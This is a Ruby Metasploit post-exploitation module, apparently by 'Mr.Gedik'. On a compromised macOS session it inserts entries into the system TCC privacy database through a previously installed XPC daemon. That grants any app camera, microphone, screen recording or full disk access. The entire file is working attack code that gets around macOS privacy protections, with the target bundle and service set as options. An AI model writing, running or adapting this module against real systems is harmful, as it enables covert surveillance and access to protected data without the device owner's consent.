require_relative '../../lib/xpc_helper'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::OSX::XPCDaemon

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'macOS XPC TCC Permission Grant',
      'Description'   => %q{
        Injects a TCC permission grant into the system TCC database via XPC daemon.
        Allows granting Camera, Microphone, Screen Recording, FDA, etc. to arbitrary apps.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Mr.Gedik'],
      'Platform'      => ['osx'],
      'SessionTypes'  => ['meterpreter', 'shell']
    ))
    register_options([
      OptString.new('BUNDLE_ID', [true, 'Target bundle identifier', 'com.apple.Terminal']),
      OptString.new('SERVICE',   [true, 'TCC service name', 'kTCCServiceCamera']),
    ])
  end

  def run
    unless xpc_client_exists?
      print_error('XPC client not found. Run xpc_daemon_install first.')
      return
    end
    bundle  = datastore['BUNDLE_ID']
    service = datastore['SERVICE']
    print_status("Granting #{service} to #{bundle}...")
    result = xpc_exec("t3 #{bundle} #{service}")
    if result && result['s'] == '1'
      print_good("TCC grant inserted: #{bundle} -> #{service}")
    else
      print_error("TCC grant failed: #{result&.dig('d') || 'unknown error'}")
    end
  end
end
